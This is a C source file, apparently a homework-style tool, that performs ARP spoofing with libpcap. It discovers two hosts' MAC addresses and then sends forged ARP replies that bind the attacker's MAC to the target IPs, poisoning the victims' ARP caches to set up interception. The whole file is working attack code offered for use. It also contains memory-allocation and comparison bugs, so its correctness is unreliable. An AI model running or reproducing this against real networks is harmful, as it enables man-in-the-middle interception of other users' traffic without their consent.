#include<stdio.h>
#include<stdlib.h>
#include<pcap.h>
#include<arpa/inet.h>
#include<string.h>
#include<net/if.h>
#include<sys/ioctl.h>
#include<stdint.h>

void usage() {
	printf("syntax: arp_spoof <interface> <sender_ip> <target_ip> [<sender_ip>] [<target_ip] ... \n");
	printf("sample: arp_spoof eth0 192.168.10.101 192.168.10.1 192.168.10.1 192.168.10.101 ...\n");
}

unsigned char MACbroadcast[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
unsigned char MACno[6] = {0, };
unsigned char ETHERTYPE[] = {0x08, 0x06};
unsigned char ETHERNET[] = {0x00, 0x01};
unsigned char IPv4[] = {0x08, 0x00};
unsigned char HWSIZE = 0x06;
unsigned char PROTOSIZE = 0x04;
unsigned char REQUEST[] = {0x00, 0x01};
unsigned char REPLY[] = {0x00, 0x02};


struct ETHERHeader {
	unsigned char dst_MAC[6];
	unsigned char src_MAC[6];
	unsigned char ETHERTYPE[2];
};

struct ARP {
	unsigned char hw_type[2];
	unsigned char proto_type[2];
	unsigned char hw_len;
	unsigned char proto_len;
	unsigned char opcode[2];
	unsigned char sender_hw_addr[6];
	unsigned char sender_ip_addr[4];
	unsigned char recver_hw_addr[6];
        unsigned char recver_ip_addr[4];
};	

struct ARPFrame {
	struct ETHERHeader ether_header;
	struct ARP arp;
};


void getMyMAC(char* dev, unsigned char* myMAC);
unsigned char* IPstr2char(char* IPstr);
struct ARPFrame* SetARPPacket(struct ARPFrame* arp_frame, unsigned char* dst_mac, unsigned char* src_mac, unsigned char* opcode, unsigned char* sendMAC, unsigned char* sendip, unsigned char* recvMAC, unsigned char* recvip);
unsigned char* getMyIP(char* dev, unsigned char* myIP); 
unsigned char* getSenderMAC(struct ARPFrame* recv_arp_frame, pcap_t *p, unsigned char* myMAC, unsigned char* myIP);

int main(int argc, char* argv[]) {
	if(argc < 4){
		usage();
		return -1;
	}

	if(argc%2 == 1) {
		printf("wrong use\n");
		return -1;
	}

	char* dev = argv[1];
	unsigned char** sendips = (unsigned char**)malloc((argc-2)/2);
	unsigned char** sendmacs = (unsigned char**)malloc((argc-2)/2);
	for(int i=0; i<(argc-2)/2; i++) {
		sendmacs[i] = (unsigned char*)malloc(6);
	}
	unsigned char** recvips = (unsigned char**)malloc((argc-2)/2);
	unsigned char* myMAC = (unsigned char*)malloc(6);
	unsigned char* myIP = (unsigned char*)malloc(4);
	pcap_t *p;
	char errbuf[PCAP_ERRBUF_SIZE];


	for(int i=0; i<(argc-2)/2; i++) {
		sendips[i] = IPstr2char(argv[i*2+2]);
		recvips[i] = IPstr2char(argv[i*2+3]);
	}

	getMyMAC(dev, myMAC);
	myIP = getMyIP(dev, myIP);
	
	struct ARPFrame arp_frame;
	struct ARPFrame* parp_frame = &arp_frame;
	
	parp_frame = SetARPPacket(parp_frame, MACbroadcast, myMAC, REQUEST, myMAC, myIP, MACno, sendips[0]);
	
	p = pcap_open_live(dev, 65535, 0, 1000, errbuf);
	pcap_sendpacket(p, (const u_char *)parp_frame, 42);
	memset(parp_frame, 0, sizeof(parp_frame));

	struct ARPFrame* precv_arp_frame;

	memcpy(sendmacs[0], getSenderMAC(precv_arp_frame, p, myMAC, myIP), 6);
	printf("%02x %02x %02x\n", sendmacs[0][3], sendmacs[0][4], sendmacs[0][5]);

	parp_frame = SetARPPacket(parp_frame, MACbroadcast, myMAC, REQUEST, myMAC, myIP, MACno, sendips[1]);

	pcap_sendpacket(p, (const u_char *)parp_frame, 42);
	memcpy(sendmacs[1], getSenderMAC(precv_arp_frame, p, myMAC, myIP), 6);

	printf("%02x %02x %02x\n", sendmacs[0][3], sendmacs[0][4], sendmacs[0][5]);

	printf("%02x\n", sendips[0][3]);

	parp_frame = SetARPPacket(parp_frame, sendmacs[0], myMAC, REPLY, myMAC, recvips[0], sendmacs[0], sendips[0]);
	pcap_sendpacket(p, (const u_char *)parp_frame, 42);

	parp_frame = SetARPPacket(parp_frame, sendmacs[1], myMAC, REPLY, myMAC, recvips[1], sendmacs[1], sendips[1]);
	pcap_sendpacket(p, (const u_char *)parp_frame, 42);


	return 0;

}

unsigned char* getMyIP(char* dev, unsigned char* myIP) {
	struct ifreq ifr;
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	strcpy(ifr.ifr_name, dev);
	ioctl(sock, SIOCGIFADDR, &ifr);

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, (char*)myIP, sizeof(struct sockaddr));
	myIP = IPstr2char((char*)myIP);
	return myIP;
}

void getMyMAC(char* dev, unsigned char* myMAC) {
	struct ifreq ifr;
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	strcpy(ifr.ifr_name, dev);
	ioctl(sock, SIOCGIFHWADDR, &ifr);

	memcpy(myMAC, (unsigned char*)ifr.ifr_hwaddr.sa_data, 6);
}

unsigned char* getSenderMAC(struct ARPFrame* recv_arp_frame, pcap_t* p, unsigned char* myMAC, unsigned char* myIP) {
	unsigned char* sendermac;
	while(true){
		const u_char* packet;
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(p, &header, &packet);
		recv_arp_frame = (struct ARPFrame*)packet;
		if(!memcmp(recv_arp_frame->ether_header.ETHERTYPE, ETHERTYPE, 2) && !memcmp(recv_arp_frame->arp.opcode, REPLY, 2) && !memcmp(recv_arp_frame->arp.recver_hw_addr, myMAC, 6) && !memcmp(recv_arp_frame->arp.recver_ip_addr, myIP, 6)){
			sendermac = (unsigned char*)recv_arp_frame->ether_header.src_MAC;
			break;
		}
	}

	return sendermac;
}

unsigned char* IPstr2char(char* IPstr) {
	unsigned char* IPchar = (unsigned char*)malloc(4);
	char* token;
	int i=0;
	token = strtok(IPstr, ".");

	while(token != NULL) {
		IPchar[i] = atoi(token);
		token = strtok(NULL, ".");
		i++;
	}

	return IPchar;
}

struct ARPFrame* SetARPPacket(struct ARPFrame* arp_frame, unsigned char* dst_mac, unsigned char* src_mac, unsigned char* opcode, unsigned char* sendMAC, unsigned char* sendip, unsigned char* recvMAC, unsigned char* recvip) {
	
	memcpy(arp_frame->ether_header.dst_MAC, dst_mac, 6);
	memcpy(arp_frame->ether_header.src_MAC, src_mac, 6);
	memcpy(arp_frame->ether_header.ETHERTYPE, ETHERTYPE, 2);

	memcpy(arp_frame->arp.hw_type, ETHERNET, 2);
	memcpy(arp_frame->arp.proto_type, IPv4, 2);
	arp_frame->arp.hw_len = HWSIZE;
	arp_frame->arp.proto_len = PROTOSIZE;
	memcpy(arp_frame->arp.opcode, opcode, 2);
	memcpy(arp_frame->arp.sender_hw_addr, sendMAC, 6);
	memcpy(arp_frame->arp.sender_ip_addr, sendip, 4);
	memcpy(arp_frame->arp.recver_hw_addr, recvMAC, 6);
	memcpy(arp_frame->arp.recver_ip_addr, recvip, 4);

	return arp_frame;
}

